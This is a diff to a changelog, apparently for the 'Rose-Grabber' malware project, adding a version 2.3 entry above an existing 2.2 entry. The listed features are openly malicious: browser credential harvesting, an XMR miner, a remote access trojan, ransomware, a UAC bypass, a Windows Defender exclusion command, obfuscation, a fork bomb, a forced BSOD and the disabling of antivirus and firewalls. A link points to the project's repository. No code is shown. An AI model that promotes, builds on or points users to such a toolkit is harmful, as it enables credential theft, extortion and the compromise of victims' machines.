@@ -1,6 +1,23 @@
+- **2.3 (2023-12-15)**
+  - Added more browser paths
+  - Added more roblox browser methods
+  - Added base code for methods
+  - Added XMR Miner
+  - Added Knight-RAT documentation
+  - Added wd exclusion cmd
+  - Added obfuscation
+  - Fixed UAC bypass
+  - Fixed Knight-RAT commands
+  - Fixed builder
+  - Fixed Ransomware
+  - Restructured logging system
+  - Restructured documentation and readme
+  - Rewrote startup script
+    (Update by gumbobr0t)
+
 - **2.2 (2023-10-20)**
   - Added bsod on run
-  - Added bash fork bomb
+  - Added batch fork bomb
   - Added block sites [unblocker](https://github.com/DamagingRose/Rose-Grabber/tree/main/resources/utils)
   - Added block protectors (e.g. anti-viruses, firewalls etc.)
   - Fixed UAC bypass
